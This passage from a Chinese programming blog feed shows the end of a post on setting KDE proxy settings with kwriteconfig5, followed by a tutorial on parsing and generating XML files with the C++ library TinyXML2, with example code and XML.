<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">kwriteconfig5 --file kioslaverc --group <span class="hljs-string">&quot;Proxy Settings&quot;</span> --key <span class="hljs-string">&quot;ProxyType&quot;</span> 1<br>kwriteconfig5 --file kioslaverc --group <span class="hljs-string">&quot;Proxy Settings&quot;</span> --key <span class="hljs-string">&quot;httpProxy&quot;</span> <span class="hljs-string">&quot;http://127.0.0.1 8888&quot;</span><br>kwriteconfig5 --file kioslaverc --group <span class="hljs-string">&quot;Proxy Settings&quot;</span> --key <span class="hljs-string">&quot;httpsProxy&quot;</span> <span class="hljs-string">&quot;http://127.0.0.1 8888&quot;</span><br>kwriteconfig5 --file kioslaverc --group <span class="hljs-string">&quot;Proxy Settings&quot;</span> --key <span class="hljs-string">&quot;socksProxy&quot;</span> <span class="hljs-string">&quot;socks://127.0.0.1 1088&quot;</span><br></code></pre></div></td></tr></table></figure>
<p><code>ProxyType</code> 可以是以下几种情况：</p>
<ul>
<li>0 无代理</li>
<li>1 手动配置</li>
<li>2 代理自动配置: PAC</li>
</ul>
<p>PAC模式:</p>
<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">kwriteconfig5 --file kioslaverc --group <span class="hljs-string">&quot;Proxy Settings&quot;</span> --key <span class="hljs-string">&quot;ProxyType&quot;</span> 2<br>kwriteconfig5 --file kioslaverc --group <span class="hljs-string">&quot;Proxy Settings&quot;</span> --key <span class="hljs-string">&quot;Proxy Config Script&quot;</span> <span class="hljs-string">&quot;&quot;</span><br></code></pre></div></td></tr></table></figure>
<p>取消系统代理:</p>
<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">kwriteconfig5 --file kioslaverc --group <span class="hljs-string">&quot;Proxy Settings&quot;</span> --key <span class="hljs-string">&quot;ProxyType&quot;</span> 0<br></code></pre></div></td></tr></table></figure>
<p>至此，通过gsettings或kwriteconfig5来修改系统代理也就小菜一碟了，其余xfce等其他桌面环境我还没有测试，所以就不知道啦。</p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>Windows</tag>
        <tag>KDE</tag>
        <tag>GNOME</tag>
        <tag>Proxy</tag>
      </tags>
  </entry>
  <entry>
    <title>TinyXML2解析XML文件</title>
    <url>/linux-tinyxml2/</url>
    <content><![CDATA[<p>上次介绍了用 <strong>libxml2</strong> 解析XML文档，用起来也挺“痛苦”的，不过这次即将介绍的同为开源 <strong>tinyxml2</strong> 可再简单不够了。。。</p>
<span id="more"></span>
<h3 id="tinyxml2"><a class="markdownIt-Anchor" href="#tinyxml2"></a> TinyXML2</h3>
<p>TinyXML2是什么？</p>
<blockquote>
<p>TinyXML-2 is a simple, small, efficient, C++ XML parser that can be easily integrated into other programs.</p>
</blockquote>
<p>与 <strong>面向过程</strong> 的libxml2相比，TinyXML2是 <strong>面向对象</strong> 的，所有的操作都被封装在 <strong>类</strong> 里面，因此变得极其简单。<br />
而且 tinyxml2 实现的代码文件为 tinyxml2.h tinyxml2.cpp，而 tinyxml2.cpp 仅大约2800行代码实现了xml解析，实在令人佩服。</p>
<blockquote>
<p>Simply compile and run. There is a visual studio 2015 project included, a simple Makefile, an Xcode project, a Code::Blocks project, and a cmake CMakeLists.txt included to help you.</p>
</blockquote>
<p>可从Github上获取其源文件： <a href="https://github.com/leethomason/tinyxml2">https://github.com/leethomason/tinyxml2</a></p>
<p>tinyxml2主要包括了一下几个类</p>
<table>
<thead>
<tr>
<th>Class</th>
<th>Class</th>
</tr>
</thead>
<tbody>
<tr>
<td>XMLAttribute</td>
<td>XMLComment</td>
</tr>
<tr>
<td>XMLConstHandle</td>
<td>XMLDeclaration</td>
</tr>
<tr>
<td>XMLDocument</td>
<td>XMLElement</td>
</tr>
<tr>
<td>XMLHandle</td>
<td>XMLNode</td>
</tr>
<tr>
<td>XMLPrinter</td>
<td>XMLText</td>
</tr>
<tr>
<td>XMLUnknown</td>
<td>XMLVisitor</td>
</tr>
</tbody>
</table>
<p>顾名思义，这些类的功能直接从名字就知道了。其中 <strong>XMLNode</strong> 为大多数类的基类，即一个节点对象。 <code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</code> 也是一个节点<br />
注释（Comment）也是一个节点对象，但属性（Attribute）却不是，因为它没有从 XMLNode类 派生出来</p>
<p>要解析一个XML文档，一般可通过 <strong>XMLDocument</strong> 加载XML文档</p>
<figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++">XMLError tinyxml2::XMLDocument::<span class="hljs-built_in">LoadFile</span>(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> * filename)	<br>XMLError tinyxml2::XMLDocument::<span class="hljs-built_in">LoadFile</span>(FILE * )<br></code></pre></div></td></tr></table></figure>
<p>相反，tinyxml2::XMLDocument::SaveFile 可保存XML文档</p>
<p>下面的例子以解析XML文档所以节点信息</p>
<figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;tinyxml2.h&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> tinyxml2; <br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">ParserXMLFile</span><span class="hljs-params">(<span class="hljs-keyword">int</span> &amp;depth,XMLNode *pNode)</span></span>&#123;<br>    <span class="hljs-keyword">int</span> index=<span class="hljs-number">0</span>;<br>    <span class="hljs-comment">// 根节点</span><br>    XMLNode *node=pNode;<br>    <span class="hljs-keyword">do</span>&#123;<br>        <span class="hljs-comment">// 如果是节点是元素</span><br>        <span class="hljs-keyword">if</span>(node-&gt;<span class="hljs-built_in">ToElement</span>())&#123;<br>            index++;<br>            XMLElement *element=node-&gt;<span class="hljs-built_in">ToElement</span>();<br>            cout.<span class="hljs-built_in">width</span>(depth);<br>            cout&lt;&lt;index&lt;&lt;<span class="hljs-string">&quot;.&quot;</span>&lt;&lt;element-&gt;<span class="hljs-built_in">Name</span>();<br>            <span class="hljs-comment">// 获取元素的文本</span><br>            <span class="hljs-keyword">if</span>(element-&gt;<span class="hljs-built_in">GetText</span>())&#123;<br>                cout&lt;&lt;<span class="hljs-string">&quot;--&gt;&quot;</span>&lt;&lt;element-&gt;<span class="hljs-built_in">GetText</span>();<br>            &#125;<br>            cout&lt;&lt;endl;<br>            <span class="hljs-comment">// 解析属性</span><br>            <span class="hljs-keyword">const</span> XMLAttribute *attribute=element-&gt;<span class="hljs-built_in">FirstAttribute</span>();<br>            <span class="hljs-keyword">bool</span> ishas_attr=<span class="hljs-literal">false</span>;<br>            <span class="hljs-keyword">if</span>(attribute) &#123;<br>                ishas_attr=<span class="hljs-literal">true</span>;<br>                cout.<span class="hljs-built_in">width</span>(depth);<br>                cout&lt;&lt;<span class="hljs-string">&quot;=&gt; &quot;</span>;<br>                <span class="hljs-keyword">while</span> (attribute)&#123;<br>                    cout&lt;&lt;attribute-&gt;<span class="hljs-built_in">Name</span>()&lt;&lt;<span class="hljs-string">&quot;:&quot;</span>&lt;&lt;attribute-&gt;<span class="hljs-built_in">Value</span>()&lt;&lt;<span class="hljs-string">&quot; | &quot;</span>;<br>                    attribute=attribute-&gt;<span class="hljs-built_in">Next</span>();<br>                &#125;<br>                <span class="hljs-keyword">if</span>(ishas_attr)cout&lt;&lt;endl;<br>            &#125;<br>            <span class="hljs-comment">// 当前节点node的下一个子节点</span><br>            <span class="hljs-keyword">if</span>(node-&gt;<span class="hljs-built_in">FirstChild</span>())&#123;<br>                depth+=<span class="hljs-number">10</span>;<br>                <span class="hljs-built_in">ParserXMLFile</span>(depth,node-&gt;<span class="hljs-built_in">FirstChild</span>());<br>            &#125;<br>        &#125;<br>        node=node-&gt;<span class="hljs-built_in">NextSibling</span>();<br>    &#125;<span class="hljs-keyword">while</span>(node);<br>    <span class="hljs-keyword">if</span>(depth&gt;<span class="hljs-number">0</span>)&#123;<br>        depth-=<span class="hljs-number">10</span>;<br>    &#125;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">testParserXML</span><span class="hljs-params">()</span></span>&#123;<br>    XMLDocument document;<br>    XMLError xmlError;<br>    <span class="hljs-keyword">if</span>((xmlError= document.<span class="hljs-built_in">LoadFile</span>(<span class="hljs-string">&quot;test1.xml&quot;</span>))==XML_SUCCESS)&#123;<br>        cout&lt;&lt;<span class="hljs-string">&quot;Load xml file ok!&quot;</span>&lt;&lt;endl;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        cout&lt;&lt;document.<span class="hljs-built_in">ErrorStr</span>()&lt;&lt;endl;<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br>    <span class="hljs-comment">// &lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br>    <span class="hljs-keyword">if</span>(document.<span class="hljs-built_in">FirstChild</span>()-&gt;<span class="hljs-built_in">ToDeclaration</span>())&#123;<br>        cout&lt;&lt;document.<span class="hljs-built_in">FirstChild</span>()-&gt;<span class="hljs-built_in">ToDeclaration</span>()-&gt;<span class="hljs-built_in">Value</span>()&lt;&lt;endl;<br>    &#125;<br>    <span class="hljs-comment">// &lt;!--This is a comment...--&gt;</span><br>    <span class="hljs-keyword">if</span>(document.<span class="hljs-built_in">FirstChild</span>()-&gt;<span class="hljs-built_in">NextSibling</span>()-&gt;<span class="hljs-built_in">ToComment</span>())&#123;<br>        cout&lt;&lt;document.<span class="hljs-built_in">FirstChild</span>()-&gt;<span class="hljs-built_in">NextSibling</span>()-&gt;<span class="hljs-built_in">ToComment</span>()-&gt;<span class="hljs-built_in">Value</span>()&lt;&lt;endl;<br>    &#125;<br>    cout&lt;&lt;<span class="hljs-string">&quot;Root Element: &quot;</span>&lt;&lt; document.<span class="hljs-built_in">RootElement</span>()-&gt;<span class="hljs-built_in">Name</span>()&lt;&lt;endl;<br>    <span class="hljs-keyword">int</span> depth=<span class="hljs-number">0</span>;<br>    <span class="hljs-comment">// 根节点下的第一个子节点</span><br>    <span class="hljs-built_in">ParserXMLFile</span>(depth,document.<span class="hljs-built_in">RootElement</span>()-&gt;<span class="hljs-built_in">FirstChild</span>());<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc,<span class="hljs-keyword">char</span> **argv)</span> </span>&#123;<br>    <span class="hljs-built_in">testParserXML</span>();<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure>
<p>上面的代码是不是很熟悉？</p>
<p>test.xml</p>
<figure class="highlight xml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="hljs-comment">&lt;!--This is a comment...--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">Theme</span> <span class="hljs-attr">version</span>=<span class="hljs-string">&quot;2.0&quot;</span> <span class="hljs-attr">magnet</span>=<span class="hljs-string">&quot;9&quot;</span> <span class="hljs-attr">alpha</span>=<span class="hljs-string">&quot;255&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">Bitmap</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;main&quot;</span> <span class="hljs-attr">file</span>=<span class="hljs-string">&quot;main.bmp&quot;</span> <span class="hljs-attr">alphacolor</span>=<span class="hljs-string">&quot;#FF0001&quot;</span> /&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">Font</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;playlist_font&quot;</span> <span class="hljs-attr">file</span>=<span class="hljs-string">&quot;FreeSansBold.ttf&quot;</span> <span class="hljs-attr">size</span>=<span class="hljs-string">&quot;11&quot;</span> /&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">BitmapFont</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;digits_font&quot;</span> <span class="hljs-attr">file</span>=<span class="hljs-string">&quot;nums_ex.bmp&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;digits&quot;</span> /&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">Window</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;playlist_window&quot;</span> <span class="hljs-attr">x</span>=<span class="hljs-string">&quot;100&quot;</span> <span class="hljs-attr">y</span>=<span class="hljs-string">&quot;332&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">Layout</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;pl_small_layout&quot;</span> <span class="hljs-attr">width</span>=<span class="hljs-string">&quot;275&quot;</span> <span class="hljs-attr">height</span>=<span class="hljs-string">&quot;116&quot;</span> <span class="hljs-attr">minwidth</span>=<span class="hljs-string">&quot;275&quot;</span> <span class="hljs-attr">minheight</span>=<span class="hljs-string">&quot;116&quot;</span> <span class="hljs-attr">maxwidth</span>=<span class="hljs-string">&quot;1000&quot;</span> <span class="hljs-attr">maxheight</span>=<span class="hljs-string">&quot;800&quot;</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">Group</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">Text</span> <span class="hljs-attr">font</span>=<span class="hljs-string">&quot;text_font&quot;</span> <span class="hljs-attr">x</span>=<span class="hljs-string">&quot;4&quot;</span> <span class="hljs-attr">y</span>=<span class="hljs-string">&quot;4&quot;</span> <span class="hljs-attr">width</span>=<span class="hljs-string">&quot;239&quot;</span> <span class="hljs-attr">text</span>=<span class="hljs-string">&quot;$N&quot;</span> /&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">Group</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">Layout</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">Layout</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;pl_big_layout&quot;</span> <span class="hljs-attr">width</span>=<span class="hljs-string">&quot;275&quot;</span> <span class="hljs-attr">height</span>=<span class="hljs-string">&quot;116&quot;</span> <span class="hljs-attr">minwidth</span>=<span class="hljs-string">&quot;275&quot;</span> <span class="hljs-attr">minheight</span>=<span class="hljs-string">&quot;116&quot;</span> <span class="hljs-attr">maxwidth</span>=<span class="hljs-string">&quot;1000&quot;</span> <span class="hljs-attr">maxheight</span>=<span class="hljs-string">&quot;800&quot;</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">Group</span> <span class="hljs-attr">x</span>=<span class="hljs-string">&quot;0&quot;</span> <span class="hljs-attr">y</span>=<span class="hljs-string">&quot;0&quot;</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">Anchor</span> <span class="hljs-attr">x</span>=<span class="hljs-string">&quot;0&quot;</span> <span class="hljs-attr">y</span>=<span class="hljs-string">&quot;116&quot;</span> <span class="hljs-attr">priority</span>=<span class="hljs-string">&quot;30&quot;</span> <span class="hljs-attr">range</span>=<span class="hljs-string">&quot;15&quot;</span> /&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">Group</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">Layout</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">Window</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">Theme</span>&gt;</span><br></code></pre></div></td></tr></table></figure>
<p>最后的结果就不显示出来了。。。思路也很简单，通过递归获取每个子节点的信息。官网也有类文档可参考，这里就不在详细介绍了。不过有个地方的确要注意</p>
<p>const char* tinyxml2::XMLNode::Value()const</p>
<figure class="highlight livecodeserver"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs livecodeserver">Document:   <span class="hljs-literal">empty</span> (<span class="hljs-literal">NULL</span> is returned,<span class="hljs-keyword">not</span> <span class="hljs-keyword">an</span> <span class="hljs-literal">empty</span> <span class="hljs-keyword">string</span>)<br>Element:    name <span class="hljs-keyword">of</span> <span class="hljs-keyword">the</span> <span class="hljs-keyword">element</span><br>Comment:    <span class="hljs-keyword">the</span> comment <span class="hljs-keyword">text</span><br>Unknown:    <span class="hljs-keyword">the</span> tag contents<br>Text:       <span class="hljs-keyword">the</span> <span class="hljs-keyword">text</span> <span class="hljs-keyword">string</span><br></code></pre></div></td></tr></table></figure>
<p>这是基类XMLNode的Value成员函数，而文档（Document）对象，返回确实一个 <strong>NULL</strong>，不是空字符串！文档对象是一个特殊的节点对象。</p>
<p>而生成XML则时更加简单了</p>
<figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">GenerateXMLFile</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *filename)</span></span>&#123;<br>    XMLDocument document;<br>    <span class="hljs-comment">// 添加 &lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br>    document.<span class="hljs-built_in">InsertFirstChild</span>(document.<span class="hljs-built_in">NewDeclaration</span>());<br>    <span class="hljs-comment">// 添加注释</span><br>    document.<span class="hljs-built_in">InsertEndChild</span>(document.<span class="hljs-built_in">NewComment</span>(<span class="hljs-string">&quot;Hello World!&quot;</span>));<br>    <span class="hljs-comment">// 添加根节点</span><br>    XMLElement *root= document.<span class="hljs-built_in">NewElement</span>(<span class="hljs-string">&quot;People&quot;</span>);<br>    document.<span class="hljs-built_in">InsertEndChild</span>(root);<br>    <span class="hljs-comment">// 添加一个新元素</span><br>    XMLElement *student=document.<span class="hljs-built_in">NewElement</span>(<span class="hljs-string">&quot;Student&quot;</span>);<br>    <span class="hljs-comment">// 设置元素属性</span><br>    student-&gt;<span class="hljs-built_in">SetAttribute</span>(<span class="hljs-string">&quot;name&quot;</span>,<span class="hljs-string">&quot;XiaoMing&quot;</span>);<br>    student-&gt;<span class="hljs-built_in">SetAttribute</span>(<span class="hljs-string">&quot;age&quot;</span>,<span class="hljs-number">16</span>);<br>    XMLElement *stu_0=document.<span class="hljs-built_in">NewElement</span>(<span class="hljs-string">&quot;Hobby&quot;</span>);<br>    stu_0-&gt;<span class="hljs-built_in">SetText</span>(<span class="hljs-string">&quot;Play Football&quot;</span>);<br>    <span class="hljs-comment">// 插入子节点</span><br>    student-&gt;<span class="hljs-built_in">InsertFirstChild</span>(stu_0);<br>    XMLElement *teacher=document.<span class="hljs-built_in">NewElement</span>(<span class="hljs-string">&quot;Teacher&quot;</span>);<br>    teacher-&gt;<span class="hljs-built_in">SetText</span>(<span class="hljs-string">&quot;I am a teacher&quot;</span>);<br>    <span class="hljs-comment">// 删除属性</span><br>    student-&gt;<span class="hljs-built_in">DeleteAttribute</span>(<span class="hljs-string">&quot;age&quot;</span>);<br>    root-&gt;<span class="hljs-built_in">InsertFirstChild</span>(student);<br>    root-&gt;<span class="hljs-built_in">InsertEndChild</span>(teacher);<br>    <span class="hljs-comment">// 保存文件</span><br>    document.<span class="hljs-built_in">SaveFile</span>(filename);<br>&#125;<br></code></pre></div></td></tr></table></figure>
<p>要打印XML文档的内容到标准输出，可以用 <strong>XMLPrinter</strong> 类，其构造函数为</p>
<figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-comment">/** Construct the printer. If the FILE* is specified,</span><br><span class="hljs-comment">    	this will print to the FILE. Else it will print</span><br><span class="hljs-comment">    	to memory, and the result is available in CStr().</span><br><span class="hljs-comment">    	If &#x27;compact&#x27; is set to true, then output is created</span><br><span class="hljs-comment">    	with only required whitespace and newlines.</span><br><span class="hljs-comment">    */</span><br>    <span class="hljs-built_in">XMLPrinter</span>( FILE* file=<span class="hljs-number">0</span>, <span class="hljs-keyword">bool</span> compact = <span class="hljs-literal">false</span>, <span class="hljs-keyword">int</span> depth = <span class="hljs-number">0</span> );<br><br></code></pre></div></td></tr></table></figure>
<p>调用如下</p>
<figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++">XMLPrinter printer;<br>document.<span class="hljs-built_in">Print</span>( &amp;printer );<br>cout&lt;&lt;printer.<span class="hljs-built_in">CStr</span>()&lt;&lt;endl;<br></code></pre></div></td></tr></table></figure>
<p>关于 XMLHandle 的作用，官网也说得很清楚，假如有一下xml</p>
<figure class="highlight xml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">Document</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">Element</span> <span class="hljs-attr">attributeA</span> = <span class="hljs-string">&quot;valueA&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">Child</span> <span class="hljs-attr">attributeB</span> = <span class="hljs-string">&quot;value1&quot;</span> /&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">Child</span> <span class="hljs-attr">attributeB</span> = <span class="hljs-string">&quot;value2&quot;</span> /&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">Element</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">Document</span>&gt;</span><br></code></pre></div></td></tr></table></figure>
<p>如果要获取 attributeB 属性的值 “value2”，一般情况下，通过如下方法获取最终的值</p>
<figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++">XMLElement* root = document.<span class="hljs-built_in">FirstChildElement</span>( <span class="hljs-string">&quot;Document&quot;</span> );<br><span class="hljs-keyword">if</span> ( root )<br>&#123;<br>    XMLElement* element = root-&gt;<span class="hljs-built_in">FirstChildElement</span>( <span class="hljs-string">&quot;Element&quot;</span> );<br>    <span class="hljs-keyword">if</span> ( element )<br>    &#123;<br>        XMLElement* child = element-&gt;<span class="hljs-built_in">FirstChildElement</span>( <span class="hljs-string">&quot;Child&quot;</span> );<br>        <span class="hljs-keyword">if</span> ( child )<br>        &#123;<br>            XMLElement* child2 = child-&gt;<span class="hljs-built_in">NextSiblingElement</span>( <span class="hljs-string">&quot;Child&quot;</span> );<br>            <span class="hljs-keyword">if</span> ( child2 )<br>            &#123;<br>                <span class="hljs-comment">// Finally do something useful.</span><br></code></pre></div></td></tr></table></figure>
<p>每一步都必须判断是否为空指针，这样的话代码就显得十分繁琐，<br />
于是 XMLHandle 提供了这样一种方法</p>
<figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-function">XMLHandle <span class="hljs-title">docHandle</span><span class="hljs-params">( &amp;document )</span></span>;<br>XMLElement* child2 = docHandle.<span class="hljs-built_in">FirstChildElement</span>( <span class="hljs-string">&quot;Document&quot;</span> ).<span class="hljs-built_in">FirstChildElement</span>( <span class="hljs-string">&quot;Element&quot;</span> ).<span class="hljs-built_in">FirstChildElement</span>().<span class="hljs-built_in">NextSiblingElement</span>();<br><span class="hljs-keyword">if</span> ( child2 )<br>&#123;<br>    <span class="hljs-comment">// do something useful</span><br></code></pre></div></td></tr></table></figure>
<p>这样的话，就不用每步都进行一次判断了。如果在这中间过程中返回了空指针，那么结果就是空指针，只有每一步都正确，结果才正确。</p>
<p>思考以下代码，看看那个代码写法正确？</p>
<figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-keyword">if</span>(document.<span class="hljs-built_in">FirstChildElement</span>(<span class="hljs-string">&quot;notPeople&quot;</span>)-&gt;<span class="hljs-built_in">FirstChildElement</span>(<span class="hljs-string">&quot;Student&quot;</span>))&#123;<br>    cout&lt;&lt;document.<span class="hljs-built_in">FirstChildElement</span>(<span class="hljs-string">&quot;People&quot;</span>)-&gt;<span class="hljs-built_in">FirstChildElement</span>(<span class="hljs-string">&quot;Student&quot;</span>)-&gt;<span class="hljs-built_in">Value</span>()&lt;&lt;endl;<br>&#125;<br></code></pre></div></td></tr></table></figure>
